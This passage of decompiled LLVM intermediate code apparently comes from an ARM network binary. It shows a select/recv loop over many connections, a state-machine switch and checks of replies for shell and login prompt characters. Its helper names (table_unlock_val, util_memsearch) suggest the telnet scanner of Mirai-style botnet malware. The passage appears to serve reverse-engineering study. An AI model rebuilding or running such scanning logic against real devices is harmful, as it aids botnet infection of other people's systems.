  %v2_10c30 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_10c30, i32* %ip.global-to-local, align 4
  %v2_10c34 = ptrtoint i32* %stack_var_-224 to i32
  store i32 %v2_10c34, i32* %r1.global-to-local, align 4
  %v2_10c38 = ptrtoint i32* %stack_var_-352 to i32
  store i32 %v2_10c38, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10c40 = add i32 %storemerge134, 1
  store i32 %v1_10c40, i32* %r0.global-to-local, align 4
  %v5_10c4c = call i32 @__libc_select(i32 %v1_10c40, i32 %v2_10c34, i32 %v2_10c38, i32 0, i32 %v2_10c30)
  %v0_10c50 = load i32, i32* @r4, align 4
  store i32 %v0_10c50, i32* %r0.global-to-local, align 4
  %v1_10c54 = inttoptr i32 %v0_10c50 to i32*
  %v2_10c54 = call i32 @__GI_time(i32* %v1_10c54)
  store i32 %v2_10c54, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2469c.163 to i32), i32* @lr, align 4
  %v0_10c5c = load i32, i32* @r4, align 4
  %v5_10c5c = trunc i32 %v0_10c5c to i16
  store i16 %v5_10c5c, i16* %stack_var_-52, align 2
  store i32 %v2_10c54, i32* @global_var_2469c.163, align 4
  %v2_11578 = ptrtoint i32* %stack_var_-45 to i32
  %v2_1158c = ptrtoint i32* %stack_var_-80 to i32
  %v2_11594 = ptrtoint i32* %stack_var_-77 to i32
  %v2_11348 = ptrtoint i32* %stack_var_-60 to i32
  %v2_1135c = ptrtoint i8* %stack_var_-56 to i32
  %v2_11364 = bitcast i8* %stack_var_-56 to i32*
  %v2_11684 = ptrtoint i32* %stack_var_-96 to i32
  br label %dec_label_pc_10c64

dec_label_pc_10c64:                               ; preds = %dec_label_pc_10dd8, %dec_label_pc_10c14
  %v0_10c70 = phi i32 [ %v1_10ddc, %dec_label_pc_10dd8 ], [ %v0_10c5c, %dec_label_pc_10c14 ]
  store i32 ptrtoint (i32* @global_var_2717c.174 to i32), i32* %r0.global-to-local, align 4
  %v3_10c68 = mul i32 %v0_10c70, 256
  store i32 %v3_10c68, i32* %r3.global-to-local, align 4
  %v2_10c6c = load i32, i32* @global_var_2717c.174, align 4
  store i32 %v2_10c6c, i32* %r1.global-to-local, align 4
  %v2_10c74 = mul i32 %v0_10c70, 288
  store i32 %v2_10c74, i32* %r2.global-to-local, align 4
  %v2_10c78 = add i32 %v2_10c6c, %v2_10c74
  store i32 %v2_10c78, i32* @r5, align 4
  %v1_10c7c = add i32 %v2_10c78, 4
  %v2_10c7c = inttoptr i32 %v1_10c7c to i32*
  %v3_10c7c = load i32, i32* %v2_10c7c, align 4
  store i32 %v3_10c7c, i32* %r0.global-to-local, align 4
  %v2_10c80 = icmp eq i32 %v3_10c7c, -1
  store i1 %v2_10c80, i1* %cpsr_c.global-to-local, align 1
  %v7_10c80 = icmp eq i32 %v3_10c7c, -1
  store i1 %v7_10c80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10c80, label %dec_label_pc_10dd8, label %dec_label_pc_10c88

dec_label_pc_10c88:                               ; preds = %dec_label_pc_10c64
  %v3_10c88 = udiv i32 %v3_10c7c, 32
  store i32 %v2_11930, i32* %r1.global-to-local, align 4
  %v3_10c94 = mul nuw nsw i32 %v3_10c88, 4
  store i32 %v3_10c94, i32* @ip, align 4
  %v2_10c98 = add i32 %v3_10c94, %v2_11930
  store i32 %v2_10c98, i32* %r2.global-to-local, align 4
  %v1_10c9c = add i32 %v2_10c98, -312
  %v2_10c9c = inttoptr i32 %v1_10c9c to i32*
  %v3_10c9c = load i32, i32* %v2_10c9c, align 4
  %v1_10ca0 = urem i32 %v3_10c7c, 32
  store i32 %v1_10ca0, i32* %r1.global-to-local, align 4
  %v2_10ca4 = add nsw i32 %v1_10ca0, -1
  %v3_10ca4 = shl i32 1, %v2_10ca4
  %v4_10ca4 = and i32 %v3_10c9c, %v3_10ca4
  %v5_10ca4 = icmp ne i32 %v4_10ca4, 0
  store i1 %v5_10ca4, i1* %cpsr_c.global-to-local, align 1
  %v6_10ca4 = ashr i32 %v3_10c9c, %v1_10ca0
  store i32 %v6_10ca4, i32* %r3.global-to-local, align 4
  %v1_10ca8 = urem i32 %v6_10ca4, 2
  %v2_10ca8 = icmp eq i32 %v1_10ca8, 0
  store i1 %v2_10ca8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10ca8, label %dec_label_pc_10cb0, label %dec_label_pc_11768

dec_label_pc_10cb0:                               ; preds = %dec_label_pc_10c88, %dec_label_pc_11818
  %v1_10cc0 = phi i32 [ %v1_10ca0, %dec_label_pc_10c88 ], [ %v1_10cc0.pre, %dec_label_pc_11818 ]
  %v0_10cb8 = phi i32 [ %v3_10c94, %dec_label_pc_10c88 ], [ %v0_10cb8.pre, %dec_label_pc_11818 ]
  store i32 %v2_11930, i32* %r3.global-to-local, align 4
  %v2_10cb8 = add i32 %v0_10cb8, %v2_11930
  store i32 %v2_10cb8, i32* %r2.global-to-local, align 4
  %v1_10cbc = add i32 %v2_10cb8, -184
  %v2_10cbc = inttoptr i32 %v1_10cbc to i32*
  %v3_10cbc = load i32, i32* %v2_10cbc, align 4
  %v2_10cc0 = add i32 %v1_10cc0, -1
  %v3_10cc0 = shl i32 1, %v2_10cc0
  %v4_10cc0 = and i32 %v3_10cbc, %v3_10cc0
  %v5_10cc0 = icmp ne i32 %v4_10cc0, 0
  store i1 %v5_10cc0, i1* %cpsr_c.global-to-local, align 1
  %v6_10cc0 = ashr i32 %v3_10cbc, %v1_10cc0
  store i32 %v6_10cc0, i32* %r3.global-to-local, align 4
  %v1_10cc4 = urem i32 %v6_10cc0, 2
  %v2_10cc4 = icmp eq i32 %v1_10cc4, 0
  store i1 %v2_10cc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10cc4, label %dec_label_pc_10dd8, label %dec_label_pc_10ccc.preheader

dec_label_pc_10ccc.preheader:                     ; preds = %dec_label_pc_10cb0
  %v0_10ccc156 = load i32, i32* @r5, align 4
  %v1_10ccc157 = add i32 %v0_10ccc156, 12
  %v2_10ccc158 = inttoptr i32 %v1_10ccc157 to i32*
  %v3_10ccc159 = load i32, i32* %v2_10ccc158, align 4
  store i32 %v3_10ccc159, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10cd0155161 = icmp eq i32 %v3_10ccc159, 0
  store i1 %v2_10cd0155161, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10cd0155161, label %dec_label_pc_10dd8, label %dec_label_pc_10cd8.lr.ph

dec_label_pc_10ccc.loopexit:                      ; preds = %dec_label_pc_11628, %dec_label_pc_11498
  %v0_10ccc = load i32, i32* @r5, align 4
  %v1_10ccc = add i32 %v0_10ccc, 12
  %v2_10ccc = inttoptr i32 %v1_10ccc to i32*
  %v3_10ccc = load i32, i32* %v2_10ccc, align 4
  store i32 %v3_10ccc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10cd0155 = icmp eq i32 %v3_10ccc, 0
  store i1 %v2_10cd0155, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10cd0155, label %dec_label_pc_10dd8, label %dec_label_pc_10cd8.lr.ph

dec_label_pc_10cd8.lr.ph:                         ; preds = %dec_label_pc_10ccc.preheader, %dec_label_pc_10ccc.loopexit
  %v0_10cd8189 = phi i32 [ %v0_10ccc, %dec_label_pc_10ccc.loopexit ], [ %v0_10ccc156, %dec_label_pc_10ccc.preheader ]
  br label %dec_label_pc_10cd8

dec_label_pc_10cd8:                               ; preds = %dec_label_pc_10cd0.backedge.thread, %dec_label_pc_10cd0.backedge, %dec_label_pc_10cd0.backedge.thread528, %dec_label_pc_10cd8.lr.ph
  %v0_116f8 = phi i32 [ %v0_10cd8189, %dec_label_pc_10cd8.lr.ph ], [ %v0_10cd8186, %dec_label_pc_10cd0.backedge ], [ %v0_10d4c, %dec_label_pc_10cd0.backedge.thread ], [ %v0_10d4c, %dec_label_pc_10cd0.backedge.thread528 ]
  %v1_10cd8 = add i32 %v0_116f8, 24
  %v2_10cd8 = inttoptr i32 %v1_10cd8 to i32*
  %v3_10cd8 = load i32, i32* %v2_10cd8, align 4
  store i32 %v3_10cd8, i32* @r3, align 4
  %v2_10cdc = icmp ugt i32 %v3_10cd8, 255
  store i1 %v2_10cdc, i1* %cpsr_c.global-to-local, align 1
  %v7_10cdc = icmp eq i32 %v3_10cd8, 256
  store i1 %v7_10cdc, i1* %cpsr_z.global-to-local, align 1
  %.pre = add i32 %v0_116f8, 28
  store i32 %.pre, i32* @sl, align 4
  br i1 %v7_10cdc, label %dec_label_pc_116f8, label %dec_label_pc_10ce8

dec_label_pc_10ce8:                               ; preds = %dec_label_pc_10cd8, %dec_label_pc_116f8
  store i32 0, i32* @r6, align 4
  %v1_10cec = load i32, i32* @sb, align 4
  %v2_10cec = inttoptr i32 %v1_10cec to i32*
  store i32 0, i32* %v2_10cec, align 4
  %v0_10cf0 = load i32, i32* @r5, align 4
  %v1_10cf0 = add i32 %v0_10cf0, 24
  %v2_10cf0 = inttoptr i32 %v1_10cf0 to i32*
  %v3_10cf0 = load i32, i32* %v2_10cf0, align 4
  store i32 %v3_10cf0, i32* %r2.global-to-local, align 4
  %v0_10cf4 = load i32, i32* @sl, align 4
  %v2_10cf4 = add i32 %v0_10cf4, %v3_10cf0
  store i32 %v2_10cf4, i32* @r4, align 4
  %v1_10cf8 = add i32 %v0_10cf0, 4
  %v2_10cf8 = inttoptr i32 %v1_10cf8 to i32*
  %v3_10cf8 = load i32, i32* %v2_10cf8, align 4
  store i32 %v3_10cf8, i32* %r0.global-to-local, align 4
  %v1_10cfc = sub i32 256, %v3_10cf0
  store i32 %v1_10cfc, i32* %r2.global-to-local, align 4
  store i32 %v2_10cf4, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10d08 = call i32 @__libc_recv(i32 %v3_10cf8, i32 %v2_10cf4, i32 %v1_10cfc, i32 16384)
  store i32 %v4_10d08, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10d0c = icmp eq i32 %v4_10d08, 0
  store i1 %v2_10d0c, i1* %cpsr_z.global-to-local, align 1
  %tmp385 = icmp slt i32 %v4_10d08, 1
  br i1 %tmp385, label %dec_label_pc_10d84, label %dec_label_pc_10d14

dec_label_pc_10d14:                               ; preds = %dec_label_pc_10ce8
  %v0_10d14 = load i32, i32* @r6, align 4
  store i32 %v0_10d14, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10d18

dec_label_pc_10d18:                               ; preds = %.thread63, %dec_label_pc_10d14
  %v3_10d24 = phi i32 [ %v1_10d28, %.thread63 ], [ %v0_10d14, %dec_label_pc_10d14 ]
  %v1_10d18 = load i32, i32* @r4, align 4
  %v2_10d18 = add i32 %v1_10d18, %v3_10d24
  %v3_10d18 = inttoptr i32 %v2_10d18 to i8*
  %v4_10d18 = load i8, i8* %v3_10d18, align 1
  %v6_10d18 = zext i8 %v4_10d18 to i32
  store i32 %v6_10d18, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10d1c = icmp eq i8 %v4_10d18, 0
  store i1 %v2_10d1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10d1c, label %bb386, label %.thread63

bb386:                                            ; preds = %dec_label_pc_10d18
  %v2_10d20 = add nuw nsw i32 %v6_10d18, 65
  store i32 %v2_10d20, i32* %r3.global-to-local, align 4
  %v2_10d24 = trunc i32 %v2_10d20 to i8
  store i8 %v2_10d24, i8* %v3_10d18, align 1
  %v0_10d28.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.thread63

.thread63:                                        ; preds = %dec_label_pc_10d18, %bb386
  %v0_10d28 = phi i32 [ %v3_10d24, %dec_label_pc_10d18 ], [ %v0_10d28.pre, %bb386 ]
  %v1_10d28 = add i32 %v0_10d28, 1
  store i32 %v1_10d28, i32* %r2.global-to-local, align 4
  %v3_10d2c = icmp uge i32 %v1_10d28, %v4_10d08
  store i1 %v3_10d2c, i1* %cpsr_c.global-to-local, align 1
  %v9_10d2c = icmp eq i32 %v1_10d28, %v4_10d08
  store i1 %v9_10d2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10d2c, label %dec_label_pc_10d34, label %dec_label_pc_10d18

dec_label_pc_10d34:                               ; preds = %.thread63, %dec_label_pc_10d88
  store i32 ptrtoint (i32* @global_var_2469c.163 to i32), i32* @ip, align 4
  %v0_10d38 = load i32, i32* @r5, align 4
  %v1_10d38 = add i32 %v0_10d38, 24
  %v2_10d38 = inttoptr i32 %v1_10d38 to i32*
  %v3_10d38 = load i32, i32* %v2_10d38, align 4
  %v2_10d3c = load i32, i32* @global_var_2469c.163, align 4
  store i32 %v2_10d3c, i32* %r2.global-to-local, align 4
  %v2_10d40 = add i32 %v3_10d38, %v4_10d08
  store i32 %v2_10d40, i32* %r3.global-to-local, align 4
  store i32 %v2_10d40, i32* %v2_10d38, align 4
  %v0_10d48 = load i32, i32* %r2.global-to-local, align 4
  %v1_10d48 = load i32, i32* @r5, align 4
  %v2_10d48 = add i32 %v1_10d48, 8
  %v3_10d48 = inttoptr i32 %v2_10d48 to i32*
  store i32 %v0_10d48, i32* %v3_10d48, align 4
  br label %dec_label_pc_10d4c

dec_label_pc_10d4c:                               ; preds = %dec_label_pc_10e6c, %dec_label_pc_10d34
  %v0_10d4c = load i32, i32* @r5, align 4
  %v1_10d4c = add i32 %v0_10d4c, 12
  %v2_10d4c = inttoptr i32 %v1_10d4c to i32*
  %v3_10d4c = load i32, i32* %v2_10d4c, align 4
  store i32 %v3_10d4c, i32* %r0.global-to-local, align 4
  %v1_10d50 = add i32 %v3_10d4c, -2
  store i32 %v1_10d50, i32* @r3, align 4
  %v7_10d54 = icmp eq i32 %v1_10d50, 8
  store i1 %v7_10d54, i1* %cpsr_z.global-to-local, align 1
  %v5_10d58 = and i32 %v1_10d50, 1073741824
  %v6_10d58 = icmp ne i32 %v5_10d58, 0
  store i1 %v6_10d58, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_10d4c, label %dec_label_pc_10cd0.backedge [
    i32 2, label %dec_label_pc_114a4
    i32 3, label %dec_label_pc_112b8
    i32 4, label %dec_label_pc_113b0
    i32 5, label %dec_label_pc_111e4
    i32 6, label %dec_label_pc_1103c
    i32 7, label %dec_label_pc_10f68
    i32 8, label %dec_label_pc_11110
    i32 9, label %dec_label_pc_10e94
    i32 10, label %dec_label_pc_10df0
  ]

dec_label_pc_10d84:                               ; preds = %dec_label_pc_10ce8
  br i1 %v2_10d0c, label %dec_label_pc_11914, label %dec_label_pc_10d88

dec_label_pc_10d88:                               ; preds = %dec_label_pc_10d84
  %v3_10d88 = icmp eq i32 %v4_10d08, -1
  store i1 %v3_10d88, i1* %cpsr_c.global-to-local, align 1
  %v8_10d88 = icmp eq i32 %v4_10d08, -1
  store i1 %v8_10d88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_10d88, label %dec_label_pc_10d90, label %dec_label_pc_10d34

dec_label_pc_10d90:                               ; preds = %dec_label_pc_10d88
  %v0_10d90 = load i32, i32* @sb, align 4
  %v1_10d90 = inttoptr i32 %v0_10d90 to i32*
  %v2_10d90 = load i32, i32* %v1_10d90, align 4
  store i32 %v2_10d90, i32* %r3.global-to-local, align 4
  %v2_10d94 = icmp ugt i32 %v2_10d90, 10
  store i1 %v2_10d94, i1* %cpsr_c.global-to-local, align 1
  %v7_10d94 = icmp eq i32 %v2_10d90, 11
  store i1 %v7_10d94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d94, label %dec_label_pc_10dd8, label %dec_label_pc_10d9c

dec_label_pc_10d9c:                               ; preds = %dec_label_pc_10d90, %dec_label_pc_11914
  %v0_10d9c = load i32, i32* @r5, align 4
  %v1_10d9c = add i32 %v0_10d9c, 4
  %v2_10d9c = inttoptr i32 %v1_10d9c to i32*
  %v3_10d9c = load i32, i32* %v2_10d9c, align 4
  store i32 %v3_10d9c, i32* %r0.global-to-local, align 4
  %v1_10da0 = call i32 @__GI___libc_close(i32 %v3_10d9c)
  store i32 %v1_10da0, i32* %r0.global-to-local, align 4
  %v0_10da4 = load i32, i32* @r5, align 4
  %v1_10da4 = add i32 %v0_10da4, 284
  %v2_10da4 = inttoptr i32 %v1_10da4 to i8*
  %v3_10da4 = load i8, i8* %v2_10da4, align 1
  %v4_10da4 = zext i8 %v3_10da4 to i32
  %v1_10da8 = add nuw nsw i32 %v4_10da4, 1
  %v1_10dac = urem i32 %v1_10da8, 256
  store i32 %v1_10dac, i32* %r3.global-to-local, align 4
  %v2_10db0 = icmp ugt i32 %v1_10dac, 8
  store i1 %v2_10db0, i1* %cpsr_c.global-to-local, align 1
  %v7_10db0 = icmp eq i32 %v1_10dac, 9
  store i1 %v7_10db0, i1* %cpsr_z.global-to-local, align 1
  %v1_10db4 = trunc i32 %v1_10da8 to i8
  store i8 %v1_10db4, i8* %v2_10da4, align 1
  %v0_10db8 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_10db8 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_10db8 = xor i1 %v1_10db8, true
  %v3_10db8 = and i1 %v0_10db8, %v2_10db8
  br i1 %v3_10db8, label %bb387, label %.thread293

.thread293:                                       ; preds = %dec_label_pc_10d9c
  store i32 -1, i32* %r2.global-to-local, align 4
  %v1_10dc4289294 = load i32, i32* @r5, align 4
  %v2_10dc4290295 = add i32 %v1_10dc4289294, 4
  %v3_10dc4291296 = inttoptr i32 %v2_10dc4290295 to i32*
  store i32 -1, i32* %v3_10dc4291296, align 4
  br label %bb388

bb387:                                            ; preds = %dec_label_pc_10d9c
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10dc4285 = load i32, i32* @r5, align 4
  %v2_10dc4286 = add i32 %v1_10dc4285, 4
  %v3_10dc4287 = inttoptr i32 %v2_10dc4286 to i32*
  store i32 -1, i32* %v3_10dc4287, align 4
  %v4_10dc8 = load i32, i32* %r0.global-to-local, align 4
  %v5_10dc8 = load i32, i32* @r5, align 4
  %v6_10dc8 = add i32 %v5_10dc8, 12
  %v7_10dc8 = inttoptr i32 %v6_10dc8 to i32*
  store i32 %v4_10dc8, i32* %v7_10dc8, align 4
  %v4_10dcc = load i32, i32* %r3.global-to-local, align 4
  %v5_10dcc = trunc i32 %v4_10dcc to i8
  %v6_10dcc = load i32, i32* @r5, align 4
  %v7_10dcc = add i32 %v6_10dcc, 284
  %v8_10dcc = inttoptr i32 %v7_10dcc to i8*
  store i8 %v5_10dcc, i8* %v8_10dcc, align 1
  %v0_10dd0.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_10dd0.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb388

bb388:                                            ; preds = %.thread293, %bb387
  %v1_10dd4 = phi i1 [ %v1_10dd0.pre, %bb387 ], [ %v0_10db8, %.thread293 ]
  %v0_10dd4 = phi i1 [ %v0_10dd0.pre, %bb387 ], [ %v1_10db8, %.thread293 ]
  %v2_10dd0 = xor i1 %v1_10dd4, true
  %v3_10dd0 = or i1 %v0_10dd4, %v2_10dd0
  br i1 %v3_10dd0, label %bb389, label %bb390

bb389:                                            ; preds = %bb388
  %v4_10dd0 = load i32, i32* @r5, align 4
  store i32 %v4_10dd0, i32* %r0.global-to-local, align 4
  br label %bb390

bb390:                                            ; preds = %bb388, %bb389
  store i32 69080, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10dd0, i32 ptrtoint (i32* @global_var_f38c.540 to i32))
  br label %dec_label_pc_10dd8

dec_label_pc_10dd8:                               ; preds = %dec_label_pc_10ccc.loopexit, %dec_label_pc_10cd0.backedge, %dec_label_pc_10ccc.preheader, %dec_label_pc_10d90, %dec_label_pc_10cb0, %dec_label_pc_10c64, %dec_label_pc_11838, %bb390
  %v3_10dd8 = load i16, i16* %stack_var_-52, align 2
  %v4_10dd8 = sext i16 %v3_10dd8 to i32
  store i32 %v4_10dd8, i32* %r3.global-to-local, align 4
  %v1_10ddc = add nsw i32 %v4_10dd8, 1
  store i32 %v1_10ddc, i32* @r4, align 4
  %v2_10de0 = icmp ugt i32 %v1_10ddc, 254
  store i1 %v2_10de0, i1* %cpsr_c.global-to-local, align 1
  %v7_10de0 = icmp eq i32 %v1_10ddc, 255
  store i1 %v7_10de0, i1* %cpsr_z.global-to-local, align 1
  %v5_10de4 = trunc i32 %v1_10ddc to i16
  store i16 %v5_10de4, i16* %stack_var_-52, align 2
  %v7_10de8 = icmp sgt i16 %v3_10dd8, 254
  br i1 %v7_10de8, label %dec_label_pc_10698, label %dec_label_pc_10c64

dec_label_pc_10df0:                               ; preds = %dec_label_pc_10d4c
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_10df4 = call i32 @table_unlock_val(i32 28)
  store i32 %v2_1135c, i32* %r1.global-to-local, align 4
  store i32 28, i32* %r0.global-to-local, align 4
  %v3_10e04 = call i32 @table_retrieve_val(i32 28, i32* %v2_11364)
  %v3_10e08 = load i8, i8* %stack_var_-56, align 1
  %v4_10e08 = sext i8 %v3_10e08 to i32
  store i32 %v3_10e04, i32* %r2.global-to-local, align 4
  %v1_10e10 = add nsw i32 %v4_10e08, -1
  store i32 %v1_10e10, i32* %r3.global-to-local, align 4
  %v0_10e14 = load i32, i32* @sl, align 4
  store i32 %v0_10e14, i32* %r0.global-to-local, align 4
  %v0_10e18 = load i32, i32* @r5, align 4
  %v1_10e18 = add i32 %v0_10e18, 24
  %v2_10e18 = inttoptr i32 %v1_10e18 to i32*
  %v3_10e18 = load i32, i32* %v2_10e18, align 4
  store i32 %v3_10e18, i32* %r1.global-to-local, align 4
  %v4_10e1c = call i32 @util_memsearch(i32 %v0_10e14, i32 %v3_10e18, i32 %v3_10e04, i32 %v1_10e10)
  %v2_10e20 = icmp eq i32 %v4_10e1c, -1
  store i1 %v2_10e20, i1* %cpsr_c.global-to-local, align 1
  %v7_10e20 = icmp eq i32 %v4_10e1c, -1
  store i1 %v7_10e20, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_10e1c, i32* @r4, align 4
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_1162c = call i32 @table_lock_val(i32 28)
  br i1 %v7_10e20, label %dec_label_pc_11628, label %dec_label_pc_10e2c

dec_label_pc_10e2c:                               ; preds = %dec_label_pc_10df0
  store i32 %v1_1162c, i32* %r0.global-to-local, align 4
  %v0_10e34 = load i32, i32* @r5, align 4
  %v1_10e34 = add i32 %v0_10e34, 4
  %v2_10e34 = inttoptr i32 %v1_10e34 to i32*
  %v3_10e34 = load i32, i32* %v2_10e34, align 4
  store i32 %v3_10e34, i32* %r0.global-to-local, align 4
  %v1_10e38 = call i32 @__GI___libc_close(i32 %v3_10e34)
  store i32 %v1_10e38, i32* %r0.global-to-local, align 4
  %v0_10e3c = load i32, i32* @r5, align 4
  %v1_10e3c = add i32 %v0_10e3c, 284
  %v2_10e3c = inttoptr i32 %v1_10e3c to i8*
  %v3_10e3c = load i8, i8* %v2_10e3c, align 1
  %v4_10e3c = zext i8 %v3_10e3c to i32
  %v1_10e40 = add nuw nsw i32 %v4_10e3c, 1
  %v1_10e44 = urem i32 %v1_10e40, 256
  store i32 %v1_10e44, i32* @r3, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_10e4c = icmp ugt i32 %v1_10e44, 9
  store i1 %v2_10e4c, i1* %cpsr_c.global-to-local, align 1
  %v7_10e4c = icmp eq i32 %v1_10e44, 10
  store i1 %v7_10e4c, i1* %cpsr_z.global-to-local, align 1
  %v2_10e50 = add i32 %v0_10e3c, 4
  %v3_10e50 = inttoptr i32 %v2_10e50 to i32*
  store i32 -1, i32* %v3_10e50, align 4
  %v0_10e54 = load i32, i32* @r3, align 4
  %v1_10e54 = trunc i32 %v0_10e54 to i8
  %v2_10e54 = load i32, i32* @r5, align 4
  %v3_10e54 = add i32 %v2_10e54, 284
  %v4_10e54 = inttoptr i32 %v3_10e54 to i8*
  store i8 %v1_10e54, i8* %v4_10e54, align 1
  %v0_10e58 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10e58, label %dec_label_pc_10e5c, label %dec_label_pc_1171c

dec_label_pc_10e5c:                               ; preds = %dec_label_pc_10e2c
  store i32 0, i32* @r3, align 4
  %v1_10e60 = load i32, i32* @r5, align 4
  %v2_10e60 = add i32 %v1_10e60, 12
  %v3_10e60 = inttoptr i32 %v2_10e60 to i32*
  store i32 0, i32* %v3_10e60, align 4
  %v0_10e64 = load i32, i32* @r3, align 4
  %v1_10e64 = trunc i32 %v0_10e64 to i8
  %v2_10e64 = load i32, i32* @r5, align 4
  %v3_10e64 = add i32 %v2_10e64, 284
  %v4_10e64 = inttoptr i32 %v3_10e64 to i8*
  store i8 %v1_10e64, i8* %v4_10e64, align 1
  br label %dec_label_pc_10e68

dec_label_pc_10e68:                               ; preds = %dec_label_pc_1171c, %dec_label_pc_10e5c
  store i32 -1, i32* @r7, align 4
  br label %dec_label_pc_10e6c

dec_label_pc_10e6c:                               ; preds = %dec_label_pc_11498, %dec_label_pc_11260, %dec_label_pc_1118c, %dec_label_pc_110b8, %dec_label_pc_10fe4, %dec_label_pc_10f10, %dec_label_pc_10e68
  %v0_10e6c = load i32, i32* @r5, align 4
  %v1_10e6c = add i32 %v0_10e6c, 24
  %v2_10e6c = inttoptr i32 %v1_10e6c to i32*
  %v3_10e6c = load i32, i32* %v2_10e6c, align 4
  %v0_10e70 = load i32, i32* @r7, align 4
  %v2_10e70 = sub i32 %v0_10e70, %v3_10e6c
  %v3_10e70 = icmp uge i32 %v0_10e70, %v3_10e6c
  store i1 %v3_10e70, i1* %cpsr_c.global-to-local, align 1
  %v4_10e70 = xor i32 %v0_10e70, %v3_10e6c
  %v5_10e70 = xor i32 %v2_10e70, %v0_10e70
  %v6_10e70 = and i32 %v5_10e70, %v4_10e70
  %v7_10e70 = icmp slt i32 %v6_10e70, 0
  %v8_10e70 = icmp slt i32 %v2_10e70, 0
  %v9_10e70 = icmp eq i32 %v0_10e70, %v3_10e6c
  store i1 %v9_10e70, i1* %cpsr_z.global-to-local, align 1
  %v2_10e74 = xor i1 %v8_10e70, %v7_10e70
  %v0_10e70.v3_10e6c = select i1 %v2_10e74, i32 %v0_10e70, i32 %v3_10e6c
  store i32 %v0_10e70.v3_10e6c, i32* %r1.global-to-local, align 4
  %v2_10e7c = sub i32 %v3_10e6c, %v0_10e70.v3_10e6c
  store i32 %v2_10e7c, i32* @r2, align 4
  store i32 %v2_10e7c, i32* %v2_10e6c, align 4
  %v0_10e84 = load i32, i32* @sl, align 4
  %v1_10e84 = load i32, i32* %r1.global-to-local, align 4
  %v2_10e84 = add i32 %v1_10e84, %v0_10e84
  store i32 %v2_10e84, i32* @r1, align 4
  store i32 %v0_10e84, i32* @r0, align 4
  %v3_10e8c = call i32 @memmove(i32 %v0_10e84, i32 %v2_10e84, i32 %v2_10e7c)
  store i32 %v3_10e8c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10d4c

dec_label_pc_10e94:                               ; preds = %dec_label_pc_10d4c
  %v1_10e94 = add i32 %v0_10d4c, 24
  %v2_10e94 = inttoptr i32 %v1_10e94 to i32*
  %v3_10e94 = load i32, i32* %v2_10e94, align 4
  store i32 %v3_10e94, i32* %r2.global-to-local, align 4
  %v1_10e98 = add i32 %v3_10e94, -1
  store i32 %v1_10e98, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10e9c = icmp eq i32 %v1_10e98, 0
  store i1 %v2_10e9c, i1* %cpsr_z.global-to-local, align 1
  %tmp393 = icmp slt i32 %v1_10e98, 1
  br i1 %tmp393, label %dec_label_pc_10cd0.backedge.thread, label %dec_label_pc_10ea4

dec_label_pc_10ea4:                               ; preds = %dec_label_pc_10e94
  %v2_10ea4 = add i32 %v1_10e98, %v0_10d4c
  store i32 %v2_10ea4, i32* %r3.global-to-local, align 4
  %v1_10ea8 = add i32 %v2_10ea4, 28
  %v2_10ea8 = inttoptr i32 %v1_10ea8 to i8*
  %v3_10ea8 = load i8, i8* %v2_10ea8, align 1
  %v4_10ea8 = zext i8 %v3_10ea8 to i32
  store i32 %v4_10ea8, i32* %r3.global-to-local, align 4
  %v2_10eac = icmp ugt i8 %v3_10ea8, 61
  store i1 %v2_10eac, i1* %cpsr_c.global-to-local, align 1
  %v7_10eac = icmp eq i8 %v3_10ea8, 62
  store i1 %v7_10eac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10eac, label %dec_label_pc_10f10, label %bb394

bb394:                                            ; preds = %dec_label_pc_10ea4
  %v3_10eb0 = icmp ugt i8 %v3_10ea8, 57
  store i1 %v3_10eb0, i1* %cpsr_c.global-to-local, align 1
  %v8_10eb0 = icmp eq i8 %v3_10ea8, 58
  store i1 %v8_10eb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10eb0, label %dec_label_pc_10f10, label %dec_label_pc_10eb8

dec_label_pc_10eb8:                               ; preds = %bb394
  %v2_10eb8 = icmp ugt i8 %v3_10ea8, 35
  store i1 %v2_10eb8, i1* %cpsr_c.global-to-local, align 1
  %v7_10eb8 = icmp eq i8 %v3_10ea8, 36
  store i1 %v7_10eb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10eb8, label %dec_label_pc_10f10, label %dec_label_pc_10ec0

dec_label_pc_10ec0:                               ; preds = %dec_label_pc_10eb8
